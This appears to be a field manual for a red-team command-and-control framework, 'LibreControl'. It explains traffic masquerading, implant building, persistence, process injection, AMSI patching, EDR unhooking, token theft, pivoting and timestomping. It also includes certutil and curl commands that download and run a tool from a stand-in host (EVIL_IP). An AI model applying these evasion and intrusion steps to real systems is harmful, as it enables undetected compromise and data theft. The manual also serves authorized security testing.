# Operator Field Manual: Tactics, Techniques, and Procedures (TTPs)

This manual defines the Standard Operating Procedures (SOP) for utilizing the **LibreControl** framework in authorized Red Team engagements or educational simulations. It acts as the definitive reference bridging the gap between the technical architecture and operational execution, ensuring that operators understand not only the syntax of commands but the operational consequences of their actions.

> [!WARNING]
> Execution of the procedures described herein without explicit, written authorization constitutes a violation of the Computer Fraud and Abuse Act (CFAA) and equivalent international laws. This framework is designed solely for infrastructure simulation and authorized resistance testing. Refer to [`RISK_ASSESSMENT.md`](RISK_ASSESSMENT.md) before proceeding.

## Infrastructure Initialization (Pre-Flight)

Before any agent can be deployed, the C2 grid must be established, healthy, and hardened against external scanning.

### Sequence of Operations

1. **Boot Grid**: Initialize the containerized environment using the orchestration manifest: `docker-compose -f build/docker-compose.yml up -d`
2. **Verify Database Integrity**: Ensure the `libre_db` container is healthy via `docker ps`. A failing database will cause the Team Server to reject all agent check-ins effectively causing a "black hole" for data.
3. **Check Logs & Key Generation**: Tail the logs of the Team Server to ensure cryptographic keys are generated correctly: `docker logs -f libre_core`

> [!NOTE]
> If the keys are regenerated (e.g., container destruction without volume persistence), all previously deployed agents will be orphaned as they will fail the handshake signature verification.

### Listener Configuration

Listeners are the "Ears" of the operation. By default, they bind to standard ports, but operational success depends on blending in with expected traffic.

- **HTTP Listener**: Operates on port `:80/tcp`. Before enabling it on a test system, confirm that no other service (such as Nginx or Apache) is already bound to this port to avoid conflicts. In a properly segmented assessment environment, port `:80/tcp` should not be exposed directly to the public internet; instead it should be placed behind a **reverse-proxy or redirector** that can enforce traffic filtering (e.g., validating expected User-Agent patterns) and provide additional monitoring visibility.
- **DNS Listener**: Operates on `:53/udp`. The host system must disable any local DNS-related services (such as `systemd-resolved` or caching resolvers) so the port can be bound without conflict. DNS-based channels have very low bandwidth and high latency, making them suitable primarily for **low-volume, controlled communication** during authorized testing, or for evaluating how defensive systems detect “low and slow” patterns when more common protocols (such as HTTP) are restricted.

### Advanced Traffic Masquerading (Malleable Profiles)

To defeat Deep Packet Inspection (DPI) and Network Detection and Response (NDR) systems, Listeners load profiles from `config/profiles.json`. Operators must validate this JSON before deployment. A static C2 profile is a trivial signature for defenders.

**Example Profile Structure:**

```
{
    "profile_name": "amazon_cloudfront_mimic",
    "http_get": {
        "uri": ["/api/v2/static/image.png", "/content/assets/style.css"],
        "headers": {
            "Server": "CloudFront",
            "Cache-Control": "max-age=3600"
        },
        "metadata_transform": {
            "location": "cookie",
            "name": "session_id",
            "encoding": "base64url"
        }
    }
}
```

> [!NOTE]
> The `metadata_transform` block dictates where the Agent's encrypted ID is hidden. Mismatches between Agent configuration and Listener profile will result in dropped packets (404 Not Found).

If your profile mimics a jQuery library download (`.js`), but the `Content-Type` header returns `text/html`, vigilant proxy logs will flag this mismatch immediately.

## Weaponization (Payload Generation)

The **Factory** service creates the implants. Do not reuse binaries between engagements; generate unique artifacts per campaign to ensure key isolation and prevent cross-contamination of Indicators of Compromise (IOCs).

### Build Parameters

When requesting a build via the Console/API, the following parameters are critical:

| Parameter    | Description                       | Tradecraft Note (Defensive/Red-Team–Safe)                                                                                                                                                                                            |
| ------------ | --------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Platform** | Target Operating System           | Ensure payloads are compiled only for systems covered by the authorized assessment scope. Mismatched OS targets are an immediate indicator of unauthorized or sloppy activity and can help defenders attribute or detect intrusions. |
| **Arch**     | CPU Architecture                  | Match the target environment accurately to avoid crashes that can alert defenders to testing activity.                                                                                                                               |
| **Protocol** | Transport Mechanism               | Different protocols trigger different defensive controls; choose based on what you intend to test (e.g., HTTPS for inspecting boundary controls, DNS for evaluating DNS-layer monitoring).                                           |
| **LHost**    | The Address the Agent connects to | Use an appropriately segmented, monitored, and logged infrastructure so defensive teams can validate and replay activity during post-assessment analysis.                                                                            |
| **Jitter**   | Randomization %                   | Introducing timing variation during testing helps exercise behavioral analytics and ensures defenders can validate whether their detection logic handles non-uniform traffic.                                                        |

### Artifact Handling

- **Output**: The Factory outputs a raw binary (e.g., `agent.exe`).
- **Signatures**: This binary is **NOT** obfuscated against AV/EDR. It contains clear-text strings and typical Go runtime indicators.
- **Procedure**: In a simulation, you may need to whitelist the specific MD5 hash of the generated agent on the target's security solution to allow execution. Acknowledging that "Evasion" (Packing, Crypters, Syscall obfuscation) is a separate discipline not covered by the auto-generated code.

## Engagement Lifecycle (The Loop)

Once the agent executes on the target, the **OODA Loop** (Observe, Orient, Decide, Act) begins. Speed is less important than stability.

### The Beaconing Concept

LibreControl follows an **asynchronous, polling-based model**. Unlike a reverse shell (TCP socket), there is no persistent connection.

1. **Queue**: You submit `shell whoami`. The command is serialized and persists in the Database `PENDING` state.
2. **Check-In**: The Agent wakes up (e.g., 60s later) and polls the Listener.
3. **Pickup**: The Agent downloads the encrypted task blob.
4. **Execution**: The Agent runs the task locally, capturing STDOUT/STDERR.
5. **Result**: The Agent posts the encrypted result at the _next_ check-in cycle.

#### The Math of Jitter

Operators must calculate the **Maximum Window of Silence** to differentiate between a "Lost Agent" (defensive action) and a "sleeping Agent" (normal operation).

$$T_{sleep} = T_{base} \pm (T_{base} \times \frac{J_{factor}}{100})$$

**Example Sleep 60s with 20% Jitter:**

- **Min Sleep**: $60 - 12 = 48s$
- **Max Sleep**: $60 + 12 = 72s$
- **Protocol**: Do not declare an agent "dead" until at least $3 \times MaxSleep$ (216s) has passed without a check-in. Panic re-spawning of agents often leads to cascading detections.

## Post-Exploitation Tradecraft

### File System Discipline

- **Working Directory Awareness**: The agent maintains a "Current Working Directory" state. Always check `pwd` before uploading files. Dropping malware in `C:\Users\User\Desktop` is a rookie mistake that leads to immediate visual detection by the user.
- **Target Selection**: Prefer hidden or system directories like `C:\Windows\Temp`, `%APPDATA%`, or `C:\ProgramData`. These locations are naturally cluttered, providing camouflage for dropped artifacts.

### Data Exfiltration

- **Small Files**: Use the standard `download` command for text files, configs, or small binaries.
- **Large Data**: Do not attempt to download GBs of data over a DNS tunnel. It will crash the listener, flood the DNS logs, and alert the SOC. Use the HTTP listener for heavy lifting, and consider chunking data or using legitimate cloud services (e.g., OneDrive) if available, rather than the C2 channel.

### Living off the Land (LotL)

To minimize dropping new binaries (which triggers AV scanning), use tools already present on the OS. This technique, known as "Living off the Land," leverages trusted, signed binaries for malicious purposes.

- **CertUtil (Windows)**: Originally for certificate management, often used for file downloads. `shell certutil.exe -urlcache -split -f "http://EVIL_IP/tool.exe" C:\Windows\Temp\tool.exe` _Note: This is a well-known signature. Use obscure flags if possible._
- **Curl (Linux)**: Standard on most modern distros. `shell curl -o /tmp/tool http://EVIL_IP/tool && chmod +x /tmp/tool`

## Lateral Movement & Pivoting

Accessing deep network segments that have no direct internet access is a primary objective of most campaigns.

### SMB Pivoting (The Daisy Chain)

- **Scenario**: Agent A (Compromised Web Server) allows internet access. Agent B (Database) is in a restricted subnet with no internet outbound, but allows SMB (Port 445) from Agent A.
- **Technique**: Agent A creates a Named Pipe listener. Agent B connects to that Pipe. Agent A acts as a router, wrapping Agent B's traffic in its own HTTP packets and forwarding them to the C2.
- **Command**: `link [target_ip] [pipe_name]`
- **Risk**: SMB traffic between servers is common in Windows environments. However, the _creation_ of non-standard named pipes is monitored. Use common pipe names like `\pipe\atsvc` (Task Scheduler) or `\pipe\epmapper` (RPC) to blend in with expected system noise.

## Persistence & Survivability

Ensuring the agent restarts when the user reboots the machine.

> [!NOTE]
> All persistence methods write to disk and modify system configuration. This increases the detection score significantly compared to memory-resident operations.

### Registry Run Keys (User Level)

- **Target**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- **Command**: `persist registry [key_name]`
- **Risk**: This is the most common persistence location ("The Low Hanging Fruit"). It is checked by every AV, EDR, and tool like Sysinternals Autoruns. Use only for short-term persistence on low-value targets.

### Service Creation (System Level)

- **Requirement**: Agent must have Elevated Privileges (Admin/System).
- **Command**: `persist service [service_name] [display_name]`
- **Risk**: Creating a service generates Event ID 7045 ("A service was installed in the system"). A vigilant SOC will notice "Google Update Service" pointing to `C:\Windows\Temp\malware.exe`. Use "Service DLL hijacking" or modify an existing stopped service rather than creating a new one if possible (requires manual config).

## Defense Evasion

Techniques to hide the agent's presence while it is running and interacting with the OS.

### Process Injection & Migration

Moving the beacon from the initial artifact (e.g., `malware.exe`) into a legitimate, long-running process (e.g., `explorer.exe`). This decouples the agent's survival from the initial file.

- **Command**: `inject [pid]`
- **Mechanism**: The agent allocates memory in the remote process (`VirtualAllocEx`), writes its shellcode (`WriteProcessMemory`), and creates a remote thread (`CreateRemoteThread` or `NtCreateThreadEx`) to execute it.
- **Tradecraft**:
    - Migrate early to `explorer.exe` (User) for desktop persistence or `spoolsv.exe` (System) to blend in.
        
> [!NOTE]
> Process Injection is an aggressive action. Modern EDRs hook the kernel callbacks for thread creation. If the target has active EDR, this command may trigger an immediate alert and kill the agent.

### Beacon Object Files (BOF) - Modular Execution

Executing C code directly in the agent's memory space without dropping a DLL to disk. This is superior to `shell` or `exec`.

- **Command**: `inline-execute [path/to/bof.o]`
- **Purpose**: Run advanced post-exploitation tools (like `Mimikatz` style credential dumping or Active Directory reconnaissance) using the COFF loader format.
- **Risk**: Extremely stealthy as it avoids the `fork & run` pattern of spawning child processes. It executes within the agent's own thread stack. The code exists only in memory, never touching the filesystem.

### AMSI Neutralization (Bypass)

The Antimalware Scan Interface (AMSI) inspects memory buffers for malicious scripts (PowerShell/VBScript/C#).

- **Command**: `patch-amsi`
- **Mechanism**: The agent identifies the `AmsiScanBuffer` function address in the loaded `amsi.dll` and patches the initial instructions (usually with `0xC3` - RET) to always return `AMSI_RESULT_CLEAN`.
- **Risk**: This involves patching read-only memory sections (`.text`). If EDR is performing memory integrity scanning, this modification will trigger a violation.

### EDR Unhooking

Removing the "spies" that EDR solutions inject into the agent's process. EDRs often inject a DLL that hooks syscalls (e.g., `NtReadVirtualMemory`) to inspect arguments.

- **Command**: `unhook`
- **Mechanism**: The agent reads a fresh, clean copy of `ntdll.dll` from disk and overwrites the in-memory `.text` section of the loaded DLL. This removes any `jmp` instructions (trampolines) inserted by the EDR.
- **Tradecraft**: Run this immediately after `inject` or migration to blind the sensors in the new process. Note that some advanced EDRs now hook the kernel directly, rendering user-mode unhooking less effective.

## Identity Engineering (Credential Access)

Manipulating user contexts without knowing passwords.

### Token Manipulation

Stealing the Access Token of another process to impersonate that user. This relies on the Windows Authentication model where processes inherit the rights of their token.

- **Command**: `steal-token [pid]`
- **Scenario**: You are `User_A` (Medium Integrity). You see `explorer.exe` running as `Domain_Admin`. You steal that token to gain network authentication privileges.
- **Technical Constraint**: You typically need `SeDebugPrivilege` (High Integrity) to read tokens from other users.
- **Types of Tokens**:
    - _Primary Token_: Defines the security context of a process.
    - _Impersonation Token_: Allows a thread to temporarily act as another user.
- **Cleanup**: `rev2self` (Revert to Self) to drop the stolen token before sleeping or terminating. Holding a high-privilege token while running a low-privilege process can look suspicious.

## Network Tunneling (SOCKS Proxy)

Turning the Agent into a pivot point for external tools.

### SOCKS5 Architecture

Allows the Operator to run tools like `Nmap`, `Burp Suite`, or `RDP` on their local machine, but have the traffic exit through the Agent's interface on the target network.

- **Command**: `socks [port]` (e.g., `socks 1080`)
- **Setup**:
    1. Operator starts SOCKS server on Team Server: `socks 1080`
    2. Operator configures local `proxychains.conf` to point to Team Server IP.
    3. Operator runs: `proxychains nmap -sT -p 445 192.168.1.10`
- **Constraint**: SOCKS over HTTP/DNS adds significant latency and overhead.
    - Each SOCKS packet is wrapped in a C2 task.
    - Use `-sT` (TCP Connect) scans. Never use `-sS` (SYN scans) or UDP scans as they require raw socket manipulation that the proxy architecture cannot reliably handle across the C2 link.

## Anti-Forensics

Techniques to frustrate post-incident analysis and timeline reconstruction.

### Timestomping ($MFT Manipulation)

When a file is uploaded, the OS assigns it the current timestamp. Forensic analysts look for "fresh" files to find malware.

- **Command**: `timestomp [target_file] [source_file]`
- **Example**: `timestomp C:\Windows\Temp\evil.exe C:\Windows\System32\kernel32.dll`
- **Effect**: Copies the Creation, Modification, Access, and Entry Modified (MACE) attributes from `kernel32.dll` to `evil.exe`.
- **Forensic Reality**: This modifies the `$STANDARD_INFORMATION` attribute in the Master File Table (MFT). However, the `$FILE_NAME` attribute often retains the original creation time. Deep forensic tools (like `analyzeMFT.py`) can detect this discrepancy, flagging the file as suspicious. It defeats casual inspection but not rigorous analysis.

## Emergency Procedures

### Lost Agent Protocol

If an agent stops checking in, panic is the enemy.

1. **Check Timestamp**: Is `LastSeen` > `SleepInterval * 2`?
2. **Hypothesis**: The agent may have crashed, been killed by EDR, or the host went offline/rebooted.
3. **Action**: Do not respawn immediately. Wait 24 hours. If it's a "Blue Team" block, re-launching immediately reveals your persistence mechanism or alternative entry points.

### The "Burn" (Clean Teardown)

At the end of the engagement, leave no trace.

1. **Task Exit**: Send the `exit` command to all active agents. This is cleaner than killing the process as it allows the agent to free memory handles.
2. **Verify**: Wait for the "Goodbye" packet.
3. **Wipe**: `docker-compose down -v`. This destroys the database and cryptographic keys.
    
> [!NOTE]
> This is irreversible. Ensure compliance logs are exported first if required for the "After Action Report" (AAR).

## Troubleshooting

- **Symptom**: Agent is running, but no beacon appears in Console.
    - _Cause A_: Network Firewall blocking the port (Egress filtering).
    - _Cause B_: Mismatch in public keys. (Did you rebuild the server volume but keep the old agent binary?)
    - _Cause C_: Jitter is too high, and the agent is currently in a long sleep cycle.
- **Symptom**: "Task Timeout" in logs.
    - _Cause_: The Agent took too long to execute (e.g., a hung process). The queue may need clearing.
- **Symptom**: SOCKS Proxy is slow or dropping connections.
    - _Cause_: The `Sleep` interval is too high. For SOCKS to be usable, the agent must be in interactive mode (`sleep 0 0`).

## Debugging & Forensics

### Direct Database Inspection

If the UI is unresponsive, Operators may query the state directly via the `database` container.

```
# Enter the DB container
docker exec -it libre_db psql -U libre_admin -d librecontrol

# Query 1: Find tasks stuck in PENDING state
SELECT task_id, command, created_at FROM tasks WHERE status = 'PENDING';

# Query 2: Retrieve raw output for a specific failed task
SELECT output_blob FROM results WHERE task_id = 'uuid-here';
```

### Network Signatures (Blue Team Perspective)

Be aware of what the defender sees.

- **JA3 Hash**: The Go `net/http` client has a distinct TLS handshake fingerprint. Sophisticated defenders can block the Agent based on its JA3 hash, even if the C2 IP changes.
    - _Mitigation_: Use the `uTLS` library in the Agent source code to randomize the ClientHello handshake (requires code modification in `cmd/agent`).
- **Packet Size Consistency**: If every beacon is exactly 1024 bytes (padded), this creates a visible heartbeat on the network graph. Variation is key.